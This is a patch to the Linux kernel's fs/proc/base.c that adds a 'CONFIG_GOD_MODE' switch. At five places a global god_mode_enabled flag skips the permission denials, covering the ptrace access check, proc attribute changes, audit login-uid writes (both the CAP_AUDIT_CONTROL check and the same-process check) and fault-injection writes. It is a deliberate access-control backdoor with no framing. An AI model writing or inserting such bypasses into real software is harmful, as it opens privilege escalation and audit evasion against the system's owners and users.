@@ -1,3 +1,6 @@
+#ifdef CONFIG_GOD_MODE
+#include <linux/god_mode.h>
+#endif
 /*
  *  linux/fs/proc/base.c
  *
@@ -365,7 +368,15 @@ static int lock_trace(struct task_struct *task)
 		return err;
 	if (!ptrace_may_access(task, PTRACE_MODE_ATTACH)) {
 		mutex_unlock(&task->signal->cred_guard_mutex);
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 	}
 	return 0;
 }
@@ -617,7 +628,15 @@ int proc_setattr(struct dentry *dentry, struct iattr *attr)
 	struct inode *inode = dentry->d_inode;
 
 	if (attr->ia_valid & ATTR_MODE)
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 	error = inode_change_ok(inode, attr);
 	if (error)
@@ -1324,12 +1343,28 @@ static ssize_t proc_loginuid_write(struct file * file, const char __user * buf,
 	uid_t loginuid;
 
 	if (!capable(CAP_AUDIT_CONTROL))
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 	rcu_read_lock();
 	if (current != pid_task(proc_pid(inode), PIDTYPE_PID)) {
 		rcu_read_unlock();
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 	}
 	rcu_read_unlock();
 
@@ -1418,7 +1453,15 @@ static ssize_t proc_fault_inject_write(struct file * file,
 	int make_it_fail;
 
 	if (!capable(CAP_SYS_RESOURCE))
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 	memset(buffer, 0, sizeof(buffer));
 	if (count > sizeof(buffer) - 1)
 		count = sizeof(buffer) - 1;
